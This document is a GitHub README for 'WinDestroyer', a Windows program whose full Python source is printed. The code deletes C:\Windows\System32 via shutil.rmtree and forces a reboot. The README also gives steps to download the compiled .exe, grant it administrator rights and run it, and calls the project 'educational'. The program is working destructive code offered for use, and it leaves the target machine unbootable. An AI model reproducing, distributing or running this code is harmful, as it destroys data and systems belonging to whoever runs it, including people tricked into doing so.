
# WinDestroyer



## What's WinDestroyer?

WinDestroyer is a straightforward program to remove the `System32` folder from Windows. In this way, the operating system will be destroyed. For this very reason, all antivirus software will warn you not to download it, as it will destroy your system. I am not responsible for any misuse of WinDestroyer, this is a project for educational purposes only and without any unethical intention.
## How does it work?

WinDestroyer is created in Python, but has been compiled into an .exe file for simplicity. Here's the code with evereything commented.
```python
# Imports necessary packages.

import shutil
import os
import time
from colorama import Fore, Style, init
import ctypes

# Sets a title to the window.

ctypes.windll.kernel32.SetConsoleTitleW("Win Destroyer")

# Starts colorama (for colors).

init()

# Shows banner.

print(f"""
{Fore.BLUE}
██╗    ██╗██╗███╗   ██╗    ██████╗ ███████╗███████╗████████╗██████╗  ██████╗ ██╗   ██╗███████╗██████╗ 
██║    ██║██║████╗  ██║    ██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔═══██╗╚██╗ ██╔╝██╔════╝██╔══██╗
██║ █╗ ██║██║██╔██╗ ██║    ██║  ██║█████╗  ███████╗   ██║   ██████╔╝██║   ██║ ╚████╔╝ █████╗  ██████╔╝
██║███╗██║██║██║╚██╗██║    ██║  ██║██╔══╝  ╚════██║   ██║   ██╔══██╗██║   ██║  ╚██╔╝  ██╔══╝  ██╔══██╗
╚███╔███╔╝██║██║ ╚████║    ██████╔╝███████╗███████║   ██║   ██║  ██║╚██████╔╝   ██║   ███████╗██║  ██║
 ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝    ╚═════╝ ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝
{Fore.CYAN}
| By H64Ox
| GitHub repository: https://github.com/H64Ox/WinDestroyer
""")

# Waits for execution.

time.sleep(1)

# Asks if the user is sure of what's he doing.

start = input(f"{Fore.RED}Are you sure you want to proceed? (this will destroy your system!) [yes / no] ")

while True:
    if start.lower() == 'no':
        print(f"{Fore.CYAN}OK, cancelling operation.")
        time.sleep(1)
        break
    elif start.lower() == 'yes':
        confirm = input(f"{Fore.RED}Please confirm you want to proceed [yes / no] ")

        while True:
            if confirm.lower() == 'no':
                print(f"{Fore.CYAN}OK, cancelling operation.")
                time.sleep(1)
                break
            elif confirm.lower() == 'yes':

                # If user accepted, proceeds to remove System32.

                print(f"{Fore.RED}Removing System32...")
                shutil.rmtree(r"C:\Windows\System32\\", ignore_errors=True)

                # Reboots system to complete the operation.

                print(f"{Fore.CYAN}Done! Restarting PC...")
                os.system("shutdown /r /t 1")
                break
            else:
                confirm = input(f"{Fore.RED}Invalid answer. Please try again [yes / no] ")
        break
    else:
        start = input(f"{Fore.RED}Invalid answer. Please try again [yes / no] ")
```
## Installation

1. Go to the [releases page](https://github.com/H64Ox/WinDestroyer/releases/tag/release) and download the latest WinDestroyer version. You should see a file called `WinDestroyer.exe` where you have downloaded it.

2. When you run it, it will ask you to grant administrator privileges. Simply click on accept.

3. It will ask you twice if you are sure to proceed (Reminder: this will completely destroy your computer).

4. After it completes the operation, the PC will restart and, then, the PC will not work anymore.
